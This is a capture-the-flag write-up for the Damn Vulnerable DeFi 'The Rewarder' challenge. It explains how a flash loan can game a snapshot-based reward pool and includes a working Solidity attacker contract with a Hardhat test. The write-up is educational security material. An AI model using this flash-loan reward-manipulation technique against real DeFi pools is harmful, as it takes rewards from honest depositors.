# Damn Vulnerable Defi: 5. The Rewarder

> There's a pool offering rewards in tokens every 5 days for those who deposit their DVT tokens into it.
> Alice, Bob, Charlie and David have already deposited some DVT tokens, and have won their rewards!
> You don't have any DVT tokens. But in the upcoming round, you must claim most rewards for yourself.
> Oh, by the way, rumours say a new pool has just landed on mainnet. Isn't it offering DVT tokens in flash loans?

**Objective of CTF:**

- Get most of the rewards, while other participants receive negligible amounts.
- Only one round must have passed.

**Target contract:**

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "@openzeppelin/contracts/token/ERC20/extensions/ERC20Snapshot.sol";
import "@openzeppelin/contracts/access/AccessControl.sol";
import "@openzeppelin/contracts/security/ReentrancyGuard.sol";
import "@openzeppelin/contracts/utils/Address.sol";
import "@openzeppelin/contracts/token/ERC20/ERC20.sol";
import "./common/DamnValuableToken.sol";

/**
 * @title AccountingToken
 * @author Damn Vulnerable DeFi (https://damnvulnerabledefi.xyz)
 * @notice A limited pseudo-ERC20 token to keep track of deposits and withdrawals
 *         with snapshotting capabilities
 */
contract AccountingToken is ERC20Snapshot, AccessControl {
  bytes32 public constant MINTER_ROLE = keccak256("MINTER_ROLE");
  bytes32 public constant SNAPSHOT_ROLE = keccak256("SNAPSHOT_ROLE");
  bytes32 public constant BURNER_ROLE = keccak256("BURNER_ROLE");

  constructor() ERC20("rToken", "rTKN") {
    _setupRole(DEFAULT_ADMIN_ROLE, msg.sender);
    _setupRole(MINTER_ROLE, msg.sender);
    _setupRole(SNAPSHOT_ROLE, msg.sender);
    _setupRole(BURNER_ROLE, msg.sender);
  }

  function mint(address to, uint256 amount) external {
    require(hasRole(MINTER_ROLE, msg.sender), "Forbidden");
    _mint(to, amount);
  }

  function burn(address from, uint256 amount) external {
    require(hasRole(BURNER_ROLE, msg.sender), "Forbidden");
    _burn(from, amount);
  }

  function snapshot() external returns (uint256) {
    require(hasRole(SNAPSHOT_ROLE, msg.sender), "Forbidden");
    return _snapshot();
  }

  function _transfer(address, address, uint256) internal pure override {
    revert("Not implemented"); // do not need transfer of this token
  }

  function _approve(address, address, uint256) internal pure override {
    revert("Not implemented"); // do not need allowance of this token
  }
}

/**
 * @title FlashLoanerPool
 * @author Damn Vulnerable DeFi (https://damnvulnerabledefi.xyz)
 * @dev A simple pool to get flash loans of DVT
 */
contract FlashLoanerPool is ReentrancyGuard {
  using Address for address;

  DamnValuableToken public immutable liquidityToken;

  constructor(address liquidityTokenAddress) {
    liquidityToken = DamnValuableToken(liquidityTokenAddress);
  }

  function flashLoan(uint256 amount) external nonReentrant {
    uint256 balanceBefore = liquidityToken.balanceOf(address(this));
    require(amount <= balanceBefore, "Not enough token balance");
    require(msg.sender.isContract(), "Borrower must be a deployed contract");

    // send loan to the borrower
    liquidityToken.transfer(msg.sender, amount);

    // call this function at the borrower
    msg.sender.functionCall(abi.encodeWithSignature("receiveFlashLoan(uint256)", amount));

    // the final balance must be >= the the initial balance
    require(liquidityToken.balanceOf(address(this)) >= balanceBefore, "Flash loan not paid back");
  }
}

/**
 * @title RewardToken
 * @author Damn Vulnerable DeFi (https://damnvulnerabledefi.xyz)
 * @dev A mintable ERC20 with 2 decimals to issue rewards
 */
contract RewardToken is ERC20, AccessControl {
  bytes32 public constant MINTER_ROLE = keccak256("MINTER_ROLE");

  constructor() ERC20("Reward Token", "RWT") {
    _setupRole(DEFAULT_ADMIN_ROLE, msg.sender);
    _setupRole(MINTER_ROLE, msg.sender);
  }

  function mint(address to, uint256 amount) external {
    require(hasRole(MINTER_ROLE, msg.sender));
    _mint(to, amount);
  }
}
```

## The Attack

The amount of code in this challenge might seem overwhelming at first, but gotta do what we gotta do. Considering actual audits and bug-bounties happen on projects with a lot more code than this, we should be grateful!

Let's list the contracts:

- **AccountingToken**: "_A limited pseudo-ERC20 token to keep track of deposits and withdrawals with snapshotting capabilities_". If you look carefully, this contract extends an ERC20Snapshot contract. Snapshot, as the name suggests, takes a snapshot of account balances at some timestamp when you call the internal `_snapshot` function. Keep in mind that access control is implemented, so that not everyone can call `snapshot`, among other things. Nothing wrong with this contract, just pure bookkeeping stuff.
- **FlashLoanerPool**: "_A simple pool to get flash loans of DVT_". This is a flash loaner, we know what it does by now. Everything seems to be done right within this contract, so we take our attention elsewhere.
- **RewardToken**: "_A mintable ERC20 with 2 decimals to issue rewards_". Yet another ERC20 token here, and everything is fine here too.
- **TheRewarderPool**: This contract is the main focus of this challenge.

### Analyzing TheRewarderPool

Let's start analyzing this rewarder contract.

- `constructor`: It is a natural choice to start with the `constructor`, whatever happens here will happen just once, and then the rest of the contract logic will be at our hands. Within the constructor, it takes the address of DVT token explicitly, but it deploys its own `AccountingToken` and `RewardToken`. Both of these tokens implemented `AccessControl`, so we now know who is authorized to call the functions there: the pool itself!
- `_recordSnapshot`: Right before finishing the construction, `_recordSnapshot` is called. This is a private function that calls `snapshot` of the underlying `AccountingToken`, also keeping record of the timestamp. It will also increment the round number.
- `withdraw` function is rather innocent, it simply allows you to withdraw rewards based on the accounting token values.
- `deposit` function allows you to deposit some DVT to the pool. If the time is right, it will also successfully distribute rewards. That timing depends on `isNewRewardsRound` function, which is a public view function so we can always make sure whether the time is right or not.
- `distributeRewards` is the key function we should look at. First of all, if `isNewRewardsRound` is true, a snapshot will be recorded via `_recordSnapshot`. Then, the rewards will be calculated directly correlated to: `yourDeposits/totalDeposits`. After that, rewards are distributed to those who have not received them yet within the round.

What we have in our minds at this point are the following:

- There is a snapshot mechanism for the accounting parts.
- You get rewarded based on your deposits at some snapshot.
- There is a flash loan giving you tokens.

If you think about these three together, you will soon find out that: if you get a flash loan, get the snapshot while you hold the loan, and then pay back the loan; then, you can be rewarded based on this loan!

This is exactly what we are going to do. Other participants will have no idea what hit them!

## Proof of Concept

Our attacker contract is as follows:

```solidity
contract TheRewarderAttacker {
  address immutable owner;
  FlashLoanerPool immutable loanPool;
  TheRewarderPool immutable rewarderPool;
  uint rewards;

  constructor(address loanPool_, address rewarderPool_) {
    loanPool = FlashLoanerPool(loanPool_);
    rewarderPool = TheRewarderPool(rewarderPool_);
    owner = msg.sender;
  }

  function pwn(uint256 amount) external {
    // take loan
    loanPool.flashLoan(amount);
    // will result in calling receiveFlashLoan, which will deposit & pull
  }

  function receiveFlashLoan(uint256 amount) external {
    // make sure this is called by the pool
    require(msg.sender == address(loanPool), "you must be the loan pool");

    // make sure this will trigger reward distribution
    require(rewarderPool.isNewRewardsRound(), "not time yet");

    // pools to be used
    DamnValuableToken liquidityToken = rewarderPool.liquidityToken();
    RewardToken rewardToken = rewarderPool.rewardToken();

    // approve tokens for deposit
    liquidityToken.approve(address(rewarderPool), amount);

    // deposit (will also call distributeRewards)
    rewarderPool.deposit(amount);

    // withdraw so that you can pay back the loan
    rewarderPool.withdraw(amount);

    // give back the loan
    liquidityToken.transfer(address(loanPool), amount);

    // forward the rewards to yourself
    require(rewardToken.transfer(owner, rewardToken.balanceOf(address(this))), "cant fetch rewards");
  }
}
```

We will call the `pwn` when the time is right, by waiting enough so that the new round will start with our transaction. Here is the test code to demonstrate:

```ts
describe('Damn Vulnerable Defi 5: The Rewarder', () => {
  let owner: SignerWithAddress;
  let attacker: SignerWithAddress;
  let alice: SignerWithAddress;
  let bob: SignerWithAddress;
  let charlie: SignerWithAddress;
  let david: SignerWithAddress;
  let users: SignerWithAddress[];

  let liquidityToken: DamnValuableToken;
  let flashLoanPool: FlashLoanerPool;
  let rewarderPool: TheRewarderPool;
  let rewardToken: RewardToken;
  let accountingToken: AccountingToken;

  const TOKENS_IN_LENDER_POOL = ethers.utils.parseEther('1000000'); // 1 million tokens

  before(async () => {
    [owner, attacker, alice, bob, charlie, david] = await ethers.getSigners();
    users = [alice, bob, charlie, david];

    liquidityToken = await ethers.getContractFactory('DamnValuableToken', owner).then(f => f.deploy());
    flashLoanPool = await ethers
      .getContractFactory('FlashLoanerPool', owner)
      .then(f => f.deploy(liquidityToken.address));
    rewarderPool = await ethers
      .getContractFactory('TheRewarderPool', owner)
      .then(f => f.deploy(liquidityToken.address));
    const poolsRewardToken = await rewarderPool.rewardToken();
    rewardToken = await ethers.getContractFactory('RewardToken', owner).then(f => f.attach(poolsRewardToken));
    const poolsAccToken = await rewarderPool.accToken();
    accountingToken = await ethers.getContractFactory('AccountingToken', owner).then(f => f.attach(poolsAccToken));

    // set initial token balance of the pool offering flash loans
    await liquidityToken.transfer(flashLoanPool.address, TOKENS_IN_LENDER_POOL);

    // alice, bob, charlie and david deposit 100 tokens each
    for (const user of users) {
      const amount = ethers.utils.parseEther('100');
      await liquidityToken.transfer(user.address, amount);
      await liquidityToken.connect(user).approve(rewarderPool.address, amount);
      await rewarderPool.connect(user).deposit(amount);
      expect(await accountingToken.balanceOf(user.address)).to.eq(amount);
    }
    expect(await accountingToken.totalSupply()).to.eq(ethers.utils.parseEther('400'));
    expect(await rewardToken.totalSupply()).to.eq(0);

    // advance time 5 days so that depositors can get rewards
    // await ethers.provider.send('evm_increaseTime', [5 * 24 * 60 * 60]); // 5 days
    await fastForward({d: 5});

    // each depositor gets 25 reward tokens ()
    for (const user of users) {
      await rewarderPool.connect(user).distributeRewards();
      expect(await rewardToken.balanceOf(user.address)).to.be.eq(ethers.utils.parseEther('25'));
    }
    expect(await rewardToken.totalSupply()).to.be.eq(ethers.utils.parseEther('100'));

    // attacker starts with zero DVT tokens in balance
    expect(await liquidityToken.balanceOf(attacker.address)).to.eq(0);

    // two rounds should have occurred so far
    // round 0 -> 1: during constructor
    // round 1 -> 2: during distributeRewards (the first time it is called after 5 days)
    expect(await rewarderPool.roundNumber()).to.be.eq(2);
  });

  it('should take most of the rewards thanks to a flash loan', async () => {
    const attackerContract = await ethers
      .getContractFactory('TheRewarderAttacker', attacker)
      .then(f => f.deploy(flashLoanPool.address, rewarderPool.address));

    // wait some time
    await fastForward({d: 5});

    await attackerContract.connect(attacker).pwn(TOKENS_IN_LENDER_POOL);
  });

  after(async () => {
    // only one round should have taken place
    expect(await rewarderPool.roundNumber()).to.be.eq(3);

    // users should get neglegible rewards this round
    for (const user of users) {
      await rewarderPool.connect(user).distributeRewards();
      const rewards = await rewardToken.balanceOf(user.address);

      // the difference between current and previous rewards balance should be lower than 0.01 tokens
      const delta = rewards.sub(ethers.utils.parseEther('25'));
      expect(delta).to.be.lt(ethers.utils.parseUnits('1', 16)); // isnt this same as parse(0.01)?
    }

    // rewards must have been issued to the attacker account
    expect(await rewardToken.totalSupply()).to.be.gt(ethers.utils.parseEther('100'));
    const rewards = await rewardToken.balanceOf(attacker.address);

    // the amount of rewards earned should be really close to 100 tokens
    const delta = ethers.utils.parseEther('100').sub(rewards);
    expect(delta).to.be.lt(ethers.utils.parseUnits('1', 17));

    // attacker finishes with zero DVT tokens in balance
    expect(await liquidityToken.balanceOf(attacker.address)).to.eq(0);
  });
});
```

The `fastForward` function here is just some utility function I wrote, it is written as follows:

```ts
/**
 * Increases the timestamp for the next block, which will take effect when it is mined.
 * Only to be used locally.
 * @param time object with `s seconds`, `m minutes`, `h hours` and `d days` where `undefined` fields are considered 0.
 */
export async function fastForward(time: {s?: number; m?: number; h?: number; d?: number}) {
  let seconds = 0;
  seconds += (time.s || 0) * 1; // for the sake of alignment <3
  seconds += (time.m || 0) * 60;
  seconds += (time.h || 0) * 60 * 60;
  seconds += (time.d || 0) * 24 * 60 * 60;
  await ethers.provider.send('evm_increaseTime', [seconds]);
}
```
